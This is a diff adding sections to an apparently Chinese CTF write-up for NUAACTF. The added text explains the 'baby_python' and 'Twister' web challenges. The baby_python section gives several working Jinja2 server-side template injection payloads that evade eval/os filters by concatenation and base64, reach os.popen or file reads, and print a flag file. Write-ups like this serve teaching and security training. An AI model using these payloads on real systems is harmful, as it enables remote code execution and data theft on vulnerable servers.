@@ -1,6 +1,6 @@
 [TOC]  
 
-# Web
+# Web  
 
 ##	真的签到 (28 solves)
 
@@ -15,6 +15,57 @@
 这个题主要是想考察信息安全的同学对于近期 Web 漏洞的关注度，这个 Web 漏洞就是 CVE-2021-43798 （这是一个漏洞编号），这个漏洞在 2021/12/07 号左右在互联网上被披露，NUAACTF 是 2021/12/11 ，日子比较接近，也符合我想考察地同学们对于 Web 漏洞跟进的能力。并且为了降低整体比赛难度，减轻同学们的压力，所以没有设置其他特别复杂的漏洞。
 
 （问题来了，为啥不用 12/09 晚上爆出的 Log4j 漏洞呢？因为忙不过来，环境弄不过来2333
+
+## baby_python
+
+ssti+简单绕过
+
+过滤了eval和os，用拼接绕过或是编码绕过都可以
+
+1.拼接绕过
+
+利用一些可利用的类，读取文件列表
+
+![web0](./img/web0.png)
+
+再把它读出来
+
+```
+?name={{().__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['o'+'s'].popen('cat ./flllll11111114aaaaaggggggggggggg').read()}}
+```
+
+因为环境是python2的，可以使用file类读
+
+```
+?name={{().__class__.__mro__[1].__subclasses__()[40]('flllll11111114aaaaaggggggggggggg').read()}}
+```
+
+or用`__builtins__`
+
+```
+?name={{().__class__.__mro__[1].__subclasses__()[71].__init__.__globals__.__builtins__['open']('flllll11111114aaaaaggggggggggggg').read()}}
+```
+
+or改一下通用payload：
+
+```
+?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %}{% if b.__class__ == {}.__class__ %}{% if 'ev'+'al' in b.keys() %}{{ b['ev'+'al']('__import__("o"+"s").popen("cat flllll11111114aaaaaggggggggggggg").read()') }}{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}
+```
+
+2.编码绕过
+
+把被过滤的部分base64一下
+
+```
+?name={{().__class__.__mro__[1].__subclasses__()[71].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')]("X19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0IGZsbGxsbDExMTExMTE0YWFhYWFnZ2dnZ2dnZ2dnZ2dnJykucmVhZCgp".decode('base64'))}}
+```
+
+## Twister
+
+(原定的白给题)
+本意就是让修改前端js，运行即可，但是混淆没有做好，可以直接看到请求的文件，所以总结是有两种方法可以解本题
+1.将function一串代码复制下来，修改`r=10`，放入控制台中运行，点击按钮就发现能打到随机数，控制台会输出`where is your flag`， 在NetWork中找到f111444g.php并查看cookie即可
+2.直接在混淆代码中找到请求的文件，访问，查看cookie即可
 
 ##	Make Me Cry (0 solves)
 
